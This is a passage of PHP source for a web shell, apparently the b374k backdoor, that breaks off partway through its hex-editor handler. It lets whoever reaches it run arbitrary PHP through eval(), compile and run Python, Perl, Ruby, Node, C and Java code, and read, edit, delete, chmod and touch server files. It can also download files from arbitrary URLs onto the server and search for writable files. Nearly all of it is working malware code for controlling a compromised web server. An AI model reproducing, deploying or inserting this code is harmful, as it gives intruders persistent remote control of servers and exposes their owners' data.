                $s_result .= notif("Copy here ? <a href='" . $s_self . "z=copyok" . "'>Yes</a> | <a href='" . $s_self . "'>No</a>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'chmod') {
                $s_result .= notif("Permissions ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='0755' name='chmodok' style='width:30px;text-align:center;' maxlength='4' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'touch') {
                $s_result .= notif("Touch ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='" . @date("d-M-Y H:i:s",
                        time()) . "' name='touchok' style='width:130px;text-align:center;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'extractzip') {
                $s_result .= notif("Extract to ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='" . hss($s_cwd) . "' name='extractzipok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'extracttar') {
                $s_result .= notif("Extract to ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='" . hss($s_cwd) . "' name='extracttarok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'extracttargz') {
                $s_result .= notif("Extract to ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='" . hss($s_cwd) . "' name='extracttargzok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'compresszip') {
                $s_result .= notif("Compress to ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='" . hss($s_cwd) . substr(md5(time()),
                        0,
                        8) . ".zip' name='compresszipok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'compresstar') {
                $s_result .= notif("Compress to ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='" . hss($s_cwd) . substr(md5(time()),
                        0,
                        8) . ".tar' name='compresstarok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'compresstargz') {
                $s_result .= notif("Compress to ? <form action='" . $s_self . "' method='post'><input class='inputz' type='text' value='" . hss($s_cwd) . substr(md5(time()),
                        0,
                        8) . ".tar.gz' name='compresstargzok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            }
        }
    }

    // view image specified by ?img=<file>
    if (isset($_GP['img'])) {
        ob_end_clean();
        $s_d   = isset($_GP['d']) ? $_GP['d'] : "";
        $s_f   = $_GP['img'];
        $s_inf = @getimagesize($s_d . $s_f);
        $s_ext = explode($s_f, ".");
        $s_ext = $s_ext[count($s_ext) - 1];
        header("Content-type: " . $s_inf["mime"]);
        header("Cache-control: public");
        header("Expires: " . @date("r", @mktime(0, 0, 0, 1, 1, 2030)));
        header("Cache-control: max-age=" . (60 * 60 * 24 * 7));#
        readfile($s_d . $s_f);
        die();
    } // rename file or folder
    elseif (isset($_GP['oldname']) && isset($_GP['rename'])) {
        $s_old = $_GP['oldname'];
        $s_new = $_GP['rename'];

        $s_renmsg = "";
        if (@is_dir($s_old)) {
            $s_renmsg = (@rename($s_old,
                $s_new)) ? "Directory " . $s_old . " renamed to " . $s_new : "Unable to rename directory " . $s_old . " to " . $s_new;
        } elseif (@is_file($s_old)) {
            $s_renmsg = (@rename($s_old,
                $s_new)) ? "File " . $s_old . " renamed to " . $s_new : "Unable to rename file " . $s_old . " to " . $s_new;
        } else {
            $s_renmsg = "Cannot find the path specified " . $s_old;
        }

        $s_result .= notif($s_renmsg);
        $s_fnew = $s_new;
    } // confirm delete
    elseif (!empty($_GP['del'])) {
        $s_del = trim($_GP['del']);
        $s_result .= notif("Delete " . basename($s_del) . " ? <a href='" . $s_self . "delete=" . pl($s_del) . "'>Yes</a> | <a href='" . $s_self . "'>No</a>");
    } // delete file
    elseif (!empty($_GP['delete'])) {
        $s_f      = $_GP['delete'];
        $s_delmsg = "";

        if (@is_file($s_f)) {
            $s_delmsg = (unlink($s_f)) ? "File removed : " . $s_f : "Unable to remove file " . $s_f;
        } elseif (@is_dir($s_f)) {
            rmdirs($s_f);
            $s_delmsg = (@is_dir($s_f)) ? "Unable to remove directory " . $s_f : "Directory removed : " . $s_f;
        } else {
            $s_delmsg = "Cannot find the path specified " . $s_f;
        }
        $s_result .= notif($s_delmsg);
    } // create dir
    elseif (!empty($_GP['mkdir'])) {
        $s_f      = $s_cwd . $_GP['mkdir'];
        $s_dirmsg = "";

        $s_num = 1;
        if (@is_dir($s_f)) {
            $s_pos = strrpos($s_f, "_");
            if ($s_pos !== false) {
                $s_num = (int) substr($s_f, $s_pos + 1);
            }
            while (@is_dir(substr($s_f, 0, $s_pos) . "_" . $s_num)) {
                $s_num ++;
            }
            $s_f = substr($s_f, 0, $s_pos) . "_" . $s_num;
        }
        if (mkdir($s_f)) {
            $s_dirmsg = "Directory created " . $s_f;
        } else {
            $s_dirmsg = "Unable to create directory " . $s_f;
        }

        $s_result .= notif($s_dirmsg);
    } // php eval() function
    if (isset($_GP['x']) && ($_GP['x'] == 'eval')) {
        $s_code       = "";
        $s_res        = "";
        $s_evaloption = "";
        $s_lang       = "php";

        if (isset($_GP['evalcode'])) {
            $s_code       = $_GP['evalcode'];
            $s_evaloption = (isset($_GP['evaloption'])) ? $_GP['evaloption'] : "";
            $s_tmpdir     = get_writabledir();

            if (isset($_GP['lang'])) {
                $s_lang = $_GP['lang'];
            }

            if (strtolower($s_lang) == 'php') {
                ob_start();
                eval($s_code);
                $s_res = ob_get_contents();
                ob_end_clean();
            } elseif (strtolower($s_lang) == 'python' || strtolower($s_lang) == 'perl' || strtolower($s_lang) == 'ruby' || strtolower($s_lang) == 'node' || strtolower($s_lang) == 'nodejs') {
                $s_rand   = md5(time() . rand(0, 100));
                $s_script = $s_tmpdir . $s_rand;
                if (file_put_contents($s_script, $s_code) !== false) {
                    $s_res = exe($s_lang . " " . $s_evaloption . " " . $s_script);
                    unlink($s_script);
                }
            } elseif (strtolower($s_lang) == 'gcc') {
                $s_script = md5(time() . rand(0, 100));
                chdir($s_tmpdir);
                if (file_put_contents($s_script . ".c", $s_code) !== false) {
                    $s_scriptout = $s_win ? $s_script . ".exe" : $s_script;
                    $s_res       = exe("gcc " . $s_script . ".c -o " . $s_scriptout . $s_evaloption);
                    if (@is_file($s_scriptout)) {
                        $s_res = $s_win ? exe($s_scriptout) : exe("chmod +x " . $s_scriptout . " ; ./" . $s_scriptout);
                        rename($s_scriptout, $s_scriptout . "del");
                        unlink($s_scriptout . "del");
                    }
                    unlink($s_script . ".c");
                }
                chdir($s_cwd);
            } elseif (strtolower($s_lang) == 'java') {
                if (preg_match("/class\ ([^{]+){/i", $s_code, $s_r)) {
                    $s_classname = trim($s_r[1]);
                    $s_script    = $s_classname;
                } else {
                    $s_rand   = "b374k_" . substr(md5(time() . rand(0, 100)), 0, 8);
                    $s_script = $s_rand;
                    $s_code   = "class " . $s_rand . " { " . $s_code . " } ";
                }
                chdir($s_tmpdir);
                if (file_put_contents($s_script . ".java", $s_code) !== false) {
                    $s_res = exe("javac " . $s_script . ".java");
                    if (@is_file($s_script . ".class")) {
                        $s_res .= exe("java " . $s_evaloption . " " . $s_script);
                        unlink($s_script . ".class");
                    }
                    unlink($s_script . ".java");
                }
                chdir($s_pwd);
            }
        }

        $s_lang_available = "<option value='php'>php</option>";
        $s_selected       = "";
        $s_access         = array("s_python", "s_perl", "s_ruby", "s_node", "s_nodejs", "s_gcc", "s_javac");
        foreach ($s_access as $s) {
            if (isset($$s)) {
                $s_t       = explode("_", $s);
                $s_checked = ($s_lang == $s_t[1]) ? "selected" : "";
                $s_lang_available .= "<option value='" . $s_t[1] . "' " . $s_checked . ">" . $s_t[1] . "</option>";
            }
        }

        $s_evaloptionclass = ($s_lang == "php") ? "sembunyi" : "";
        $s_e_result        = (!empty($s_res)) ? "<pre id='evalres' class='bt' style='margin:4px 0 0 0;padding:6px 0;' >" . hss($s_res) . "</pre>" : "";
        $s_result .= "<form action='" . $s_self . "' method='post'>
					<textarea id='evalcode' name='evalcode' style='height:150px;' class='txtarea'>" . hss($s_code) . "</textarea>
					<table><tr><td style='padding:0;'><p><input type='submit' name='evalcodesubmit' class='inputzbut' value='Go !' style='width:120px;height:30px;' /></p>
					</td><td><select name='lang' onchange='evalselect(this);' class='inputzbut' style='width:120px;height:30px;padding:4px;'>
					" . $s_lang_available . "
					</select>
					</td>
					<td><div title='If you want to give additional option to interpreter or compiler, give it here' id='additionaloption' class='" . $s_evaloptionclass . "'>Additional option&nbsp;&nbsp;<input class='inputz' style='width:400px;' type='text' name='evaloption' value='" . hss($s_evaloption) . "' id='evaloption' /></div></td>
					</tr>
					</table>
					" . $s_e_result . "
					<input type='hidden' name='x' value='eval' />
					</form>";
    } // find
    elseif (isset($_GP['find'])) {
        $s_p = $_GP['find'];

        $s_type      = isset($_GP['type']) ? $_GP['type'] : "sfile";
        $s_sfname    = (!empty($_GP['sfname'])) ? $_GP['sfname'] : '';
        $s_sdname    = (!empty($_GP['sdname'])) ? $_GP['sdname'] : '';
        $s_sfcontain = (!empty($_GP['sfcontain'])) ? $_GP['sfcontain'] : '';

        $s_sfnameregexchecked = $s_sfnameicasechecked = $s_sdnameregexchecked = $s_sdnameicasechecked = $s_sfcontainregexchecked = $s_sfcontainicasechecked = $s_swritablechecked = $s_sreadablechecked = $s_sexecutablechecked = "";
        $s_sfnameregex        = $s_sfnameicase = $s_sdnameregex = $s_sdnameicase = $s_sfcontainregex = $s_sfcontainicase = $s_swritable = $s_sreadable = $s_sexecutable = false;

        if (isset($_GP['sfnameregex'])) {
            $s_sfnameregex        = true;
            $s_sfnameregexchecked = "checked";
        }
        if (isset($_GP['sfnameicase'])) {
            $s_sfnameicase        = true;
            $s_sfnameicasechecked = "checked";
        }
        if (isset($_GP['sdnameregex'])) {
            $s_sdnameregex        = true;
            $s_sdnameregexchecked = "checked";
        }
        if (isset($_GP['sdnameicase'])) {
            $s_sdnameicase        = true;
            $s_sdnameicasechecked = "checked";
        }
        if (isset($_GP['sfcontainregex'])) {
            $s_sfcontainregex        = true;
            $s_sfcontainregexchecked = "checked";
        }
        if (isset($_GP['sfcontainicase'])) {
            $s_sfcontainicase        = true;
            $s_sfcontainicasechecked = "checked";
        }
        if (isset($_GP['swritable'])) {
            $s_swritable        = true;
            $s_swritablechecked = "checked";
        }
        if (isset($_GP['sreadable'])) {
            $s_sreadable        = true;
            $s_sreadablechecked = "checked";
        }
        if (isset($_GP['sexecutable'])) {
            $s_sexecutable        = true;
            $s_sexecutablechecked = "checked";
        }

        $s_sexecb = (function_exists("is_executable")) ? "<input class='css-checkbox' type='checkbox' name='sexecutable' value='sexecutable' id='se' " . $s_sexecutablechecked . " /><label class='css-label' for='se'>Executable</span>" : "";

        $s_candidate = array();
        if (isset($_GP['sgo'])) {
            $s_af = "";

            $s_candidate = getallfiles($s_p);
            if ($s_type == 'sfile') {
                $s_candidate = @array_filter($s_candidate, "is_file");
            } elseif ($s_type == 'sdir') {
                $s_candidate = @array_filter($s_candidate, "is_dir");
            }

            foreach ($s_candidate as $s_a) {
                if ($s_type == 'sdir') {
                    if (!empty($s_sdname)) {
                        if ($s_sdnameregex) {
                            if ($s_sdnameicase) {
                                if (!preg_match("/" . $s_sdname . "/i", basename($s_a))) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            } else {
                                if (!preg_match("/" . $s_sdname . "/", basename($s_a))) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            }
                        } else {
                            if ($s_sdnameicase) {
                                if (strpos(strtolower(basename($s_a)), strtolower($s_sdname)) === false) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            } else {
                                if (strpos(basename($s_a), $s_sdname) === false) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            }
                        }
                    }
                } elseif ($s_type == 'sfile') {
                    if (!empty($s_sfname)) {
                        if ($s_sfnameregex) {
                            if ($s_sfnameicase) {
                                if (!preg_match("/" . $s_sfname . "/i", basename($s_a))) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            } else {
                                if (!preg_match("/" . $s_sfname . "/", basename($s_a))) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            }
                        } else {
                            if ($s_sfnameicase) {
                                if (strpos(strtolower(basename($s_a)), strtolower($s_sfname)) === false) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            } else {
                                if (strpos(basename($s_a), $s_sfname) === false) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            }
                        }
                    }
                    if (!empty($s_sfcontain)) {
                        $s_sffcontent = @fgc($s_a);
                        if ($s_sfcontainregex) {
                            if ($s_sfcontainicase) {
                                if (!preg_match("/" . $s_sfcontain . "/i", $s_sffcontent)) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            } else {
                                if (!preg_match("/" . $s_sfcontain . "/", $s_sffcontent)) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            }
                        } else {
                            if ($s_sfcontainicase) {
                                if (strpos(strtolower($s_sffcontent), strtolower($s_sfcontain)) === false) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            } else {
                                if (strpos($s_sffcontent, $s_sfcontain) === false) {
                                    $s_candidate = array_diff($s_candidate, array($s_a));
                                }
                            }
                        }
                    }
                }
            }
        }

        $s_f_result = "";
        $s_link     = "";
        foreach ($s_candidate as $s_c) {
            $s_c = trim($s_c);
            if ($s_swritable && !@is_writable($s_c)) {
                continue;
            }
            if ($s_sreadable && !@is_readable($s_c)) {
                continue;
            }
            if ($s_sexecutable && !@is_executable($s_c)) {
                continue;
            }

            if ($s_type == "sfile") {
                $s_link = $s_self . "view=" . pl($s_c);
            } elseif ($s_type == "sdir") {
                $s_link = $s_self . "view=" . pl(cp($s_c));
            }
            $s_f_result .= "<p class='notif' ondblclick=\"return go('" . adds($s_link) . "',event);\"><a href='" . $s_link . "'>" . $s_c . "</a></p>";
        }

        $s_tsdir  = ($s_type == "sdir") ? "selected" : "";
        $s_tsfile = ($s_type == "sfile") ? "selected" : "";

        if (!@is_dir($s_p)) {
            $s_result .= notif("Cannot find the path specified " . $s_p);
        }

        $s_result .= "<form action='" . $s_self . "' method='post'>
		<div class='mybox'><h2>Find</h2>
		<table class='myboxtbl'>
		<tr><td style='width:140px;'>Search in</td>
		<td colspan='2'><input style='width:100%;' value='" . hss($s_p) . "' class='inputz' type='text' name='find' /></td></tr>
		<tr onclick=\"findtype('sdir');\">
			<td>Dirname contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sdname' value='" . hss($s_sdname) . "' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sdnameregex' id='sdn' " . $s_sdnameregexchecked . " /><label class='css-label' for='sdn'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sdnameicase' id='sdi' " . $s_sdnameicasechecked . " /><label class='css-label' for='sdi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick=\"findtype('sfile');\">
			<td>Filename contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfname' value='" . hss($s_sfname) . "' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sfnameregex'  id='sfn' " . $s_sfnameregexchecked . " /><label class='css-label' for='sfn'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sfnameicase'  id='sfi' " . $s_sfnameicasechecked . " /><label class='css-label' for='sfi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick=\"findtype('sfile');\">
			<td>File contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfcontain' value='" . hss($s_sfcontain) . "' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sfcontainregex' id='sff' " . $s_sfcontainregexchecked . " /><label class='css-label' for='sff'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sfcontainicase' id='sffi' " . $s_sfcontainicasechecked . " /><label class='css-label' for='sffi'>Case Insensitive</label>
			</td>
		</tr>
		<tr>
			<td>Permissions</td>
			<td colspan='2'>
				<input type='checkbox' class='css-checkbox' name='swritable' id='sw' " . $s_swritablechecked . " /><label class='css-label' for='sw'>Writable</label>
				<input type='checkbox' class='css-checkbox' name='sreadable' id='sr' " . $s_sreadablechecked . " /><label class='css-label' for='sr'>Readable</label>
				" . $s_sexecb . "
			</td>
		</tr>
		<tr><td>
		<input type='submit' name='sgo' class='inputzbut' value='Search !' style='width:120px;height:30px;margin:0;' />
		</td>
		<td>
		<select name='type' id='type' class='inputzbut' style='width:120px;height:30px;margin:0;padding:4px;'>
			<option value='sfile' " . $s_tsfile . ">Search file</option>
			<option value='sdir' " . $s_tsdir . ">Search dir</option>
		</select>
		</td>
		<td></td></tr>
		</table>
		</div>
		</form>
		<div>
		" . $s_f_result . "
		</div>";
    } // upload
    elseif (isset($_GP['x']) && ($_GP['x'] == 'upload')) {
        $s_result = " ";
        $s_msg    = "";
        if (isset($_GP['uploadhd'])) {
            $c = count($_FILES['filepath']['name']);
            for ($i = 0; $i < $c; $i ++) {
                $s_fn = $_FILES['filepath']['name'][$i];
                if (empty($s_fn)) {
                    continue;
                }
                if (is_uploaded_file($_FILES['filepath']['tmp_name'][$i])) {
                    $s_p = cp($_GP['savefolder'][$i]);
                    if (!@is_dir($s_p)) {
                        mkdir($s_p);
                    }
                    if (isset($_GP['savefilename'][$i]) && (trim($_GP['savefilename'][$i]) != "")) {
                        $s_fn = $_GP['savefilename'][$i];
                    }
                    $s_tm = $_FILES['filepath']['tmp_name'][$i];
                    $s_pi = cp($s_p) . $s_fn;
                    $s_st = @move_uploaded_file($s_tm, $s_pi);
                    if ($s_st) {
                        $s_msg .= notif("File uploaded to <a href='" . $s_self . "view=" . pl($s_pi) . "'>" . $s_pi . "</a>");
                    } else {
                        $s_msg .= notif("Failed to upload " . $s_fn);
                    }
                } else {
                    $s_msg .= notif("Failed to upload " . $s_fn);
                }
            }
        } elseif (isset($_GP['uploadurl'])) {
            // function dlfile($s_url,$s_fpath)
            $c = count($_GP['fileurl']);
            for ($i = 0; $i < $c; $i ++) {
                $s_fu = $_GP['fileurl'][$i];
                if (empty($s_fu)) {
                    continue;
                }

                $s_p = cp($_GP['savefolderurl'][$i]);
                if (!@is_dir($s_p)) {
                    mkdir($s_p);
                }

                $s_fn = basename($s_fu);
                if (isset($_GP['savefilenameurl'][$i]) && (trim($_GP['savefilenameurl'][$i]) != "")) {
                    $s_fn = $_GP['savefilenameurl'][$i];
                }
                $s_fp = cp($s_p) . $s_fn;
                $s_st = dlfile($s_fu, $s_fp);
                if ($s_st) {
                    $s_msg .= notif("File uploaded to <a href='" . $s_self . "view=" . pl($s_fp) . "'>" . $s_fp . "</a>");
                } else {
                    $s_msg .= notif("Failed to upload " . $s_fn);
                }
            }
        } else {
            if (!@is_writable($s_cwd)) {
                $s_msg = notif("Directory " . $s_cwd . " is not writable, please change to a writable one");
            }
        }

        if (!empty($s_msg)) {
            $s_result .= $s_msg;
        }
        $s_result .= "
			<form action='" . $s_self . "' method='post' enctype='multipart/form-data'>
			<div class='mybox'><h2><div class='but' onclick='adduploadc();'>+</div>Upload from computer</h2>
			<table class='myboxtbl'>
			<tbody id='adduploadc'>
			<tr><td style='width:140px;'>File</td><td><input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /></td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='" . hss($s_cwd) . "' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /></td></tr>
			</tbody>
			<tfoot>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadhd' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			<input type='hidden' name='x' value='upload' />
			</td></tr>
			</tfoot>
			</table>
			</div>
			</form>
			<form action='" . $s_self . "' method='post'>
			<div class='mybox'><h2><div class='but' onclick='adduploadi();'>+</div>Upload from internet</h2>
			<table class='myboxtbl'>
			<tbody id='adduploadi'>
			<tr><td style='width:150px;'>File URL</td><td><input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' />
			</td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='" . hss($s_cwd) . "' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /></td></tr>
			</tbody>
			<tfoot>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadurl' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			<input type='hidden' name='x' value='upload' />
			</td></tr>
			</table>
			</div>
			</form>";
    } // view file
    elseif (isset($_GP['view'])) {
        $s_f = $_GP['view'];
        if (isset($s_fnew) && (trim($s_fnew) != "")) {
            $s_f = $s_fnew;
        }

        $s_owner = "";
        if (@is_file($s_f)) {
            $targetdir = dirname($s_f);
            chdir($targetdir);
            $s_cwd = cp(getcwd());
            setcookie("cwd", $s_cwd, time() + $s_login_time);

            if (!$s_win && $s_posix) {
                $s_name  = posix_getpwuid(fileowner($s_f));
                $s_group = posix_getgrgid(filegroup($s_f));
                $s_owner = "<tr><td>Owner</td><td>" . $s_name['name'] . "<span class='gaya'>:</span>" . $s_group['name'] . "</td></tr>";
            }
            $s_filn = basename($s_f);
            $s_result .= "<table class='viewfile' style='width:100%;'>
			<tr><td style='width:140px;'>Filename</td><td><span id='" . cs($s_filn) . "_link'>" . $s_f . "</span>
			<div id='" . cs($s_filn) . "_form' class='sembunyi'>
			<form action='" . $s_self . "' method='post'>
				<input type='hidden' name='oldname' value='" . hss($s_f) . "' style='margin:0;padding:0;' />
				<input type='hidden' name='view' value='" . hss($s_f) . "' />
				<input class='inputz' style='width:200px;' type='text' name='rename' value='" . hss($s_f) . "' />
				<input class='inputzbut' type='submit' value='rename' />
			</form>
			<input class='inputzbut' type='button' value='x' onclick=\"tukar_('" . cs($s_filn) . "_form','" . cs($s_filn) . "_link');\" />
			</div>
			</td></tr>
			<tr><td>Size</td><td>" . gs($s_f) . " (" . @filesize($s_f) . ")</td></tr>
			<tr><td>Permission</td><td>" . gp($s_f) . "</td></tr>
			" . $s_owner . "
			<tr><td>Create time</td><td>" . @date("d-M-Y H:i:s", filectime($s_f)) . "</td></tr>
			<tr><td>Last modified</td><td>" . @date("d-M-Y H:i:s", filemtime($s_f)) . "</td></tr>
			<tr><td>Last accessed</td><td>" . @date("d-M-Y H:i:s", fileatime($s_f)) . "</td></tr>
			<tr><td>Actions</td><td>
			<a href='" . $s_self . "edit=" . pl($s_f) . "' title='edit'>edit</a> | <a href='" . $s_self . "hexedit=" . pl($s_f) . "' title='edit as hex'>hex</a> | <a href=\"javascript:tukar_('" . cs($s_filn) . "_link','" . cs($s_filn) . "_form');\" title='rename'>ren</a> | <a href='" . $s_self . "del=" . pl($s_f) . "' title='delete'>del</a> | <a href='" . $s_self . "dl=" . pl($s_f) . "'>dl</a>
			</td></tr>
			<tr><td>View</td><td>
			<a href='" . $s_self . "view=" . pl($s_f) . "&type=text" . "'>text</a> | <a href='" . $s_self . "view=" . pl($s_f) . "&type=code" . "'>code</a> | <a href='" . $s_self . "view=" . pl($s_f) . "&type=image" . "'>image</a> | <a href='" . $s_self . "view=" . pl($s_f) . "&type=audio" . "'>audio</a> | <a href='" . $s_self . "view=" . pl($s_f) . "&type=video" . "'>video</a>
			</td></tr>
			</table>";

            $s_t         = "";
            $s_mime      = "";
            $s_mime_list = gzinflate(base64_decode($s_mime_types));
            $s_ext_pos   = strrpos($s_f, ".");
            if ($s_ext_pos !== false) {
                $s_ext = trim(substr($s_f, $s_ext_pos), ".");
                if (preg_match("/([^\s]+)\ .*\b" . $s_ext . "\b.*/i", $s_mime_list, $s_r)) {
                    $s_mime = $s_r[1];
                }
            }

            $s_iinfo = @getimagesize($s_f);
            if (strtolower(substr($s_filn, - 3, 3)) == "php") {
                $s_t = "code";
            } elseif (is_array($s_iinfo)) {
                $s_t = 'image';
            } elseif (!empty($s_mime)) {
                $s_t = substr($s_mime, 0, strpos($s_mime, "/"));
            }

            if (isset($_GP['type'])) {
                $s_t = $_GP['type'];
            }

            if ($s_t == "image") {
                $s_width   = (int) $s_iinfo[0];
                $s_height  = (int) $s_iinfo[1];
                $s_imginfo = "Image type = ( " . $s_iinfo['mime'] . " )<br />
					Image Size = <span class='gaul'>( </span>" . $s_width . " x " . $s_height . "<span class='gaul'> )</span><br />";
                if ($s_width > 800) {
                    $s_width   = 800;
                    $s_imglink = "<p><a href='" . $s_self . "img=" . pl($s_filn) . "'>
					<span class='gaul'>[ </span>view full size<span class='gaul'> ]</span></a></p>";
                } else {
                    $s_imglink = "";
                }

                $s_result .= "<div class='viewfilecontent' style='text-align:center;'>" . $s_imglink . "
					<img width='" . $s_width . "' src='" . $s_self . "img=" . pl($s_filn) . "' alt='" . $s_filn . "' style='margin:8px auto;padding:0;border:0;' /></div>";

            } elseif ($s_t == "code") {
                $s_result .= "<div class=\"viewfilecontent\">";
                $s_file = wordwrap(@fgc($s_f), 160, "\n", true);
                $s_buff = highlight_string($s_file, true);
                $s_old  = array("0000BB", "000000", "FF8000", "DD0000", "007700");
                $s_new  = ($s_theme == "bright") ? $s_highlight_bright : $s_highlight_dark;
                $s_buff = str_replace($s_old, $s_new, $s_buff);
                $s_result .= $s_buff;
                $s_result .= "</div>";
            } elseif ($s_t == "audio" || $s_t == "video") {
                $s_result .= "<div class='viewfilecontent' style='text-align:center;'>
							<" . $s_t . " controls>
							<source src='" . hss($s_self . "dltype=raw&dlpath=" . $s_f) . "' type='" . $s_mime . "'>
								<object data='" . hss($s_self . "dltype=raw&dlpath=" . $s_f) . "'>
									<embed src='" . hss($s_self . "dltype=raw&dlpath=" . $s_f) . "'>
								</object>
							</" . $s_t . ">
							</div>";
            } else {
                $s_result .= "<pre style='padding: 3px 8px 0 8px;' class='viewfilecontent'>";
                $s_result .= str_replace("<", "&lt;",
                    str_replace(">", "&gt;", (wordwrap(@fgc($s_f), 160, "\n", true))));
                $s_result .= "</pre>";
            }
        } elseif (@is_dir($s_f)) {
            chdir($s_f);
            $s_cwd = cp(getcwd());
            setcookie("cwd", $s_cwd, time() + $s_login_time);
            $s_result .= showdir($s_cwd);
        } else {
            $s_result .= notif("Cannot find the path specified " . $s_f);
        }

    } // edit file
    elseif (isset($_GP['edit'])) {
        $s_f   = $_GP['edit'];
        $s_fc  = "";
        $s_fcs = "";

        if (isset($_GP['new']) && ($_GP['new'] == 'yes')) {
            $s_num = 1;
            if (@is_file($s_f)) {
                $s_pos = strrpos($s_f, "_");
                if ($s_pos !== false) {
                    $s_num = (int) substr($s_f, $s_pos + 1);
                }
                while (@is_file(substr($s_f, 0, $s_pos) . "_" . $s_num)) {
                    $s_num ++;
                }
                $s_f = substr($s_f, 0, $s_pos) . "_" . $s_num;
            }
        } else {
            if (@is_file($s_f)) {
                $s_fc = @fgc($s_f);
            }
        }

        if (isset($_GP['fc'])) {
            $s_fc   = $_GP['fc'];
            $s_eol  = $_GP['eol'];
            $s_eolf = pack("H*", geol($s_fc));
            $s_eolh = pack("H*", $s_eol);
            $s_fc   = str_replace($s_eolf, $s_eolh, $s_fc);

            if ($s_filez = fopen($s_f, "w")) {
                $s_time = @date("d-M-Y H:i:s", time());
                if (fwrite($s_filez, $s_fc) !== false) {
                    $s_fcs = "File saved @ " . $s_time;
                } else {
                    $s_fcs = "Failed to save";
                }
                fclose($s_filez);
            } else {
                $s_fcs = "Permission denied";
            }
        } elseif (@is_file($s_f) && !@is_writable($s_f)) {
            $s_fcs = "This file is not writable";
        }

        $s_eol = geol($s_fc);

        if (!empty($s_fcs)) {
            $s_result .= notif($s_fcs);
        }
        $s_result .= "<form action='" . $s_self . "' method='post'>
				<textarea id='fc' name='fc' class='txtarea'>" . hss($s_fc) . "</textarea>
				<p style='text-align:center;'><input type='text' class='inputz' style='width:99%;' name='edit' value='" . hss($s_f) . "' /></p>
				<p><input type='submit' class='inputzbut' value='Save !' style='width:120px;height:30px;' /></p>
				<input type='hidden' name='eol' value='" . $s_eol . "' />
				</form>";

    } // hex edit file
    elseif (isset($_GP['hexedit'])) {
        $s_f     = $_GP['hexedit'];
        $s_fc    = "";
        $s_fcs   = "";
        $s_hexes = "";
        $s_lnum  = 0;

        if (!empty($_GP['hx']) || !empty($_GP['hxt'])) {
            if (!empty($_GP['hx'])) {
                foreach ($_GP['hx'] as $s_hex) {
                    $s_hexes .= str_replace(" ", "", $s_hex);
                }
            } elseif (!empty($_GP['hxt'])) {
                $s_hexes = trim($_GP['hxt']);
            }
            if ($s_filez = fopen($s_f, "w")) {
                $s_bins = pack("H*", $s_hexes);
                $s_time = @date("d-M-Y H:i:s", time());
                if (fwrite($s_filez, $s_bins) !== false) {
